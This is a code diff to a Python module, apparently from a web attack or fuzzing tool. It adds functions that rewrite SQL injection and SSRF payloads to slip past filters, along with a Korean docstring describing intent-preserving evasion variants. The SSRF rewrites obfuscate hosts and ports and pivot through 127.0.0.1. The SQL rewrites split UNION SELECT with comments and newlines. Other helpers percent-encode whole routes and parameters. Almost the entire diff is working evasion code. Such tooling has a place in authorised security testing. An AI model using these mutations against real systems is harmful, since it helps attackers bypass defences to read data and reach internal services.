@@ -9,6 +9,7 @@
 from __future__ import annotations
 
 import time
+import re
 import urllib.parse
 
 from .models import (
@@ -70,11 +71,128 @@ def insert_sql_comments(payload: str) -> str:
             .replace("select", "se/**/lect"))
 
 
-def evasion_variants(payload: str) -> list:
-    """동일 의도를 유지한 회피 변형들을 우선순위 순으로 반환한다."""
+def _decode_repeated(value: str, rounds: int = 3) -> str:
+    current = value
+    for _ in range(rounds):
+        decoded = urllib.parse.unquote_plus(current)
+        if decoded == current:
+            break
+        current = decoded
+    return current
+
+
+def _encode_all(value: str) -> str:
+    return "".join(f"%{byte:02X}" for byte in value.encode("utf-8"))
+
+
+def fully_encode_target(payload: str) -> str:
+    """Encode route, parameter names, and values while keeping HTTP delimiters."""
+    base, separator, query = payload.partition("?")
+    encoded_base = ("/" if base.startswith("/") else "") + _encode_all(base.lstrip("/"))
+    if not separator:
+        return encoded_base
+    encoded_items = []
+    for item in query.split("&"):
+        name, equals, value = item.partition("=")
+        encoded = _encode_all(_decode_repeated(name))
+        if equals:
+            encoded += "=" + _encode_all(_decode_repeated(value))
+        encoded_items.append(encoded)
+    return encoded_base + "?" + "&".join(encoded_items)
+
+
+def _query_value_variant(payload: str, transform) -> str:
+    base, separator, query = payload.partition("?")
+    if not separator or not query:
+        return payload
+    first, amp, rest = query.partition("&")
+    name, equals, value = first.partition("=")
+    if not equals:
+        return payload
+    transformed = transform(_decode_repeated(value))
+    encoded = urllib.parse.quote(transformed, safe="/*'(),|:[]")
+    return f"{base}?{name}={encoded}" + (("&" + rest) if amp else "")
+
+
+def _ssrf_variants(payload: str, endpoint_port: int | None) -> list[str]:
+    base, separator, query = payload.partition("?")
+    first, _, _ = query.partition("&")
+    name, equals, value = first.partition("=")
+    if not separator or not equals:
+        return []
+    decoded = _decode_repeated(value)
+    if not decoded.lower().startswith(("http://", "https://")):
+        return []
+    try:
+        parsed = urllib.parse.urlsplit(decoded)
+        host = parsed.hostname or ""
+        port = parsed.port
+    except ValueError:
+        return []
+    if not host:
+        return []
+    scheme = parsed.scheme.lower()
+    path = parsed.path or "/"
+    suffix = ("?" + parsed.query) if parsed.query else ""
+
+    def outer(url: str) -> str:
+        return f"{base}?{name}={urllib.parse.quote(url, safe='')}"
+
     variants = []
-    for fn in (url_encode_tokens, vary_keyword_case, insert_sql_comments, double_encode_tokens):
-        v = fn(payload)
+    shown_host = f"[{host}]" if ":" in host else host
+    authority_port = f":{port}" if port is not None else ""
+    variants.append(outer(f"{scheme}://{shown_host.rstrip('.')}.{authority_port}{path}{suffix}"))
+    variants.append(outer(f"{scheme}://{shown_host.upper()}{authority_port}{path}?"))
+    if port is not None:
+        variants.append(outer(f"{scheme}://{shown_host}:0{port}{path}{suffix}"))
+    variants.append(outer(f"{scheme}://{shown_host}{authority_port}//{path.lstrip('/')}{suffix}"))
+    if endpoint_port:
+        inner = urllib.parse.quote(decoded, safe="")
+        pivot = f"http://127.0.0.1:{endpoint_port}{base}?{name}={inner}"
+        variants.append(outer(pivot))
+    variants.append(payload.replace("%", "%25"))
+    return variants
+
+
+def _sql_variants(payload: str) -> list[str]:
+    upper = _decode_repeated(payload).upper()
+    if "UNION" not in upper or "SELECT" not in upper:
+        return []
+
+    def separator_comments(value: str) -> str:
+        value = re.sub(
+            r"\bUNION\s+(ALL\s+)?SELECT\b",
+            lambda match: "UNION/**/" + ("ALL/**/" if match.group(1) else "") + "SELECT",
+            value,
+            flags=re.IGNORECASE,
+        )
+        return re.sub(r"\s+FROM\s+", "/**/FROM/**/", value, flags=re.IGNORECASE)
+
+    def control_whitespace(value: str) -> str:
+        return re.sub(r"\s+", "\n\n", value)
+
+    def bracket_source(value: str) -> str:
+        return re.sub(r"\bapp_meta\b", "[app_meta]", value, flags=re.IGNORECASE)
+
+    return [
+        _query_value_variant(payload, separator_comments),
+        _query_value_variant(payload, control_whitespace),
+        _query_value_variant(payload, bracket_source),
+    ]
+
+
+def evasion_variants(payload: str, endpoint_port: int | None = None) -> list:
+    """동일 의도를 유지한 회피 변형들을 관측된 방어 반응 순서로 반환한다."""
+    variants = []
+    candidates = (
+        _ssrf_variants(payload, endpoint_port)
+        + _sql_variants(payload)
+        + [fully_encode_target(payload)]
+        + [fn(payload) for fn in (
+            url_encode_tokens, vary_keyword_case, insert_sql_comments, double_encode_tokens
+        )]
+    )
+    for v in candidates:
         if v != payload and v not in variants:
             variants.append(v)
     return variants
